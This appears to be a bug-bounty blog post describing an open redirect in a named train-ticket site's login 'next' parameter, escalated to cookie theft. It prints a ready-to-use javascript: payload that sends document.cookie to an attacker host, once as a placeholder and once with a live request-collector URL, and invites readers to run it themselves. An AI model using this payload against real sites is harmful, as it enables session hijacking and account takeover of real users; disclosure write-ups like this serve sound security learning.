---
title: "Open Redirect To Account TakeOver"
date: 2024-10-07 00:00:00 +0000
categories: [Bug Hunting]
tags: [bughunting, cybersecurity]
---

# Open Redirect To Account TakeOver

Today, I'm thrilled to share my adventure of discovering a critical flaw in the MyTrainPal website—an open redirect vulnerability that could potentially lead to account takeover.

## The Discovery

Picture this: it's just an ordinary day, I'm sipping my coffee and poking around the MyTrainPal login page when—bam! I stumble upon something extraordinary. A vulnerability so subtle yet powerful, it could redirect unsuspecting users to malicious websites. The sneaky culprit? The `next` parameter in the login URL.

## Proof of Concept (POC)

The thrill of the hunt began with constructing a vulnerable URL by modifying the `next` parameter:

```
https://www.mytrainpal.com/signin?next=[MALICIOUS_WEBSITE]
```

For demonstration purposes, I replaced `[MALICIOUS_WEBSITE]` with `https://google.com`. To my amazement, after logging in, I got redirected to Google instead of the expected MyTrainPal page. This confirmed the vulnerability—jackpot!

## The Exploitation

Here's where things got even more interesting. By injecting a JavaScript payload into the `next` parameter, I was able to steal cookies from a logged-in user. Imagine the implications—an attacker could hijack a user's session and access their account!

**Example payload used:**

```
https://www.mytrainpal.com/signin?next=j%09avascript:document.location='http://{attackersite.com}/'+document.cookie
```

After finding the open redirect, I realized it was out of scope (OOS) for bug bounties. Determined to escalate this vulnerability, I turned to Google, researching how to leverage the open redirect for something more impactful. That's when I discovered the potential for cookie theft.

## Live Proof of Concept (POC)

Here's a live POC where an attacker can create a web server to capture user cookies. For this demo, I used Requestbin to collect user cookies. An attacker could send a URL like this:

```
https://www.mytrainpal.com/signin?next=j%09avascript:document.location='https://eookdicn57xrfug.m.pipedream.net/'+document.cookie
```

Make sure to replace the URL with your own Requestbin URL to see it in action.

![image](/assets/img/open_redirect_to_acc_0.jpg)

## Impact and Importance

This vulnerability's impact could be severe. An attacker could create a phishing website resembling the MyTrainPal login page to steal user credentials or session cookies. Protecting users from such threats is crucial.

## Responsible Reporting

Understanding the significance of responsible bug reporting, I refrained from stealing any user credentials or setting up malicious servers during my testing. My goal was to help MyTrainPal improve its security and safeguard its users.

## Conclusion

Bug hunting is not just a task—it's an exhilarating adventure. With a keen eye, patience, and persistence, we can unmask hidden flaws and make the digital world a safer place. So, next time you encounter a bug, embrace the challenge, and happy hunting!